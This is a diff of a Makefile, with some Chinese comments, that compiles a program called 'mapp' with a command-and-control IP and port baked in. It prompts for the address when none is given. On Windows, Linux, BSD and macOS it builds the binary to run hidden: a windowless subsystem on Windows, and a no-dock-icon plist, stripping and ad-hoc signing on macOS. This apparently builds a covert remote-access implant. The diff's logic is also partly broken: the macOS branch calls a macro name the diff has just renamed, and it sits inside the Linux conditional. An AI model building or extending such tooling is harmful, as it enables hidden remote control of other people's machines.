@@ -4,43 +4,55 @@ TARGET = mapp
 BIN = $(TARGET)
 
 
-define wininp
+define wininput
 ifeq ($(C2_IP),)
-C2_IP:=$(shell cmd /v:on /c "set /p X=请输入IP: >con & echo !X!")
+C2_IP:=$(shell cmd /v:on /c "set /p X=IP: >con & echo !X!")
 endif
 ifeq ($(C2_PORT),)
-C2_PORT:=$(shell cmd /v:on /c "set /p X=请输入端口: >con & echo !X!")
+C2_PORT:=$(shell cmd /v:on /c "set /p X=PORT: >con & echo !X!")
 endif
 endef
 
-define uninp
+define uninput
 ifeq ($(C2_IP),)
-C2_IP := $$(shell sh -c 'read -p "请输入IP: " t; echo $$$$t')
+C2_IP := $$(shell sh -c 'read -p "IP: " t; echo $$$$t')
 endif
 ifeq ($(C2_PORT),)
-C2_PORT := $$(shell sh -c 'read -p "请输入端口: " t; echo $$$$t')
+C2_PORT := $$(shell sh -c 'read -p "PORT: " t; echo $$$$t')
 endif
 endef
+
+
+# 检查是否有 cl.exe，有则用 cl，没有则用 gcc
+ifneq ($(findstring cl,$(shell where cl 2>nul)),)
+CC := cl
+else
+CC := gcc
+endif
+
 
 all:
 ifeq ($(OS),Windows_NT)
-	$(eval $(call wininp))
-ifeq ($(CC),cl)
-	# Windows MSVC
-	$(CC) $(SRC) /Fe:$(BIN).exe /Os /MD /DC2_IP="$(C2_IP)" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
+	$(eval $(call wininput))
+ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
+	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 else
-	# Windows MinGW
+ifeq ($(shell uname -s),MSYS) # MSYS/MSYS2
+	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
+endif
+ifeq ($(shell uname -s),Windows_NT) # W32/64devkit
+	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
+endif
+ifeq ($(shell uname -s),cygwin) # Cygwin
 	$(CC) $(SRC) -o $(BIN) -Os -s -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 endif
 
-ifeq ($(shell uname -s),Linux)
-	$(eval $(call uninp))
-	# Linux
-	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
 
-# 修正后的 Darwin 编译逻辑
+else
+ifeq ($(shell uname -s),Linux)
+	$(eval $(call uninput))
+	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 ifeq ($(shell uname -s),Darwin)
 	$(eval $(call uninp))
 	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
@@ -63,6 +75,11 @@ ifeq ($(shell uname -s),Darwin)
 	@strip $(BIN) 2>/dev/null || true
 	@codesign -s - --force $(BIN) 2>/dev/null || true
 endif
+else ifeq ($(shell uname -s),BSD)
+	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
+endif
+endif
+
 clean:
 ifeq ($(OS),Windows_NT)
 	cmd /c erase /f /s /q $(BIN) $(BIN).*
